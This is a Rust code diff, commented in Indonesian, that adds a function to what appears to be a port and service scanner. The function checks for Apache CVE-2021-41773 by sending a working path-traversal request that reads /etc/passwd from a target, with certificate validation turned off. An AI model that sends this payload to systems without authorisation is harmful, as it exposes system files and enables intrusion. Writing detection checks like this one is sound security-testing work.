@@ -13,6 +13,30 @@ pub fn categorize_port(port: u16) -> String {
     }
 }
 
+/// Fungsi asinkron untuk active verification kerentanan Apache CVE-2021-41773
+pub async fn verify_apache_cve_2021_41773(target_ip: &str, port: u16) -> Result<bool, reqwest::Error> {
+    let client = reqwest::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()?;
+
+    let url = format!(
+        "http://{}:{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
+        target_ip, port
+    );
+
+    let res = client.get(&url).send().await?;
+    
+    if res.status().is_success() {
+        let body = res.text().await?;
+        // Deteksi apabila isi file passwd dibocorkan (root:x:0:0)
+        if body.contains("root:x:0:0") {
+            return Ok(true);
+        }
+    }
+    
+    Ok(false)
+}
+
 /// Analyze service dan generate warnings
 pub fn analyze_service(port: u16, service: &str, banner: Option<&str>) -> Vec<crate::utils::report::Vulnerability> {
     let mut vulnerabilities = Vec::new();
